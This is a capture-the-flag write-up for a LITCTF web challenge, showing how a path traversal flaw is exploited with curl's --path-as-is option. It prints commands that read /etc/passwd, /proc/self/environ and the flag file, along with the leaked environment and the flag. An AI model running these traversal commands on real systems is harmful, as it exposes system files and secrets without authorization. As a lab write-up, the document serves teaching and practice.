---
title: traversed
date: 2023-12-10T13:37:49+02:00
author: zacian
tags:
  - Web
draft: false
---

## Description

I made this website! you can't see anything else though... right?? URL: http://litctf.org:31778/

## Solution

Now this challenge gave us a link to a web application which is vulnerable to LFI.

We an simply test that by reading `../../../../../../../../../etc/passwd`

Now puting that directly in the web URL would not work because the standard behavior of HTTP clients is to normalize the path portion of URLs by squashing dot segments as a typical filesystem would

So when using curl for solving this challenge we can specify the flag `--path-as-is` which helps to disable this behaviour 

```bash
curl --path-as-is http://litctf.org:31778/../../../../../etc/passwd
```

Source of Knowledge : https://httpie.io/docs/cli/--path-as-is

This will list our the passwd file. Now If you don't know, in linux most of the environment variable are saved in `/proc/self/environ` file. So now if we try to read that 

```bash
curl --path-as-is http://litctf.org:31778/../../../../../proc/self/environ
```

we get the following warning

```
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

So we can put together the following command

```
NODE_VERSION=16.20.2HOSTNAME=ac58ff1071dfYARN_VERSION=1.22.19BUN_INSTALL=/root/.bunHOME=/rootPATH=/root/.bun/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/app
```

Now in the end we can see `/binPWD=/app`, this is often used by in or by developers for putting or testing their applications, like flask backend within docker.

Now if we try to cat the file `flag` in the `/app` directory we get our flag

```bash
curl --path-as-is http://litctf.org:31778/../../../../../app/flag.txt --output -
```

```
Flag : LITCTF{backtr@ked_230fim0}
```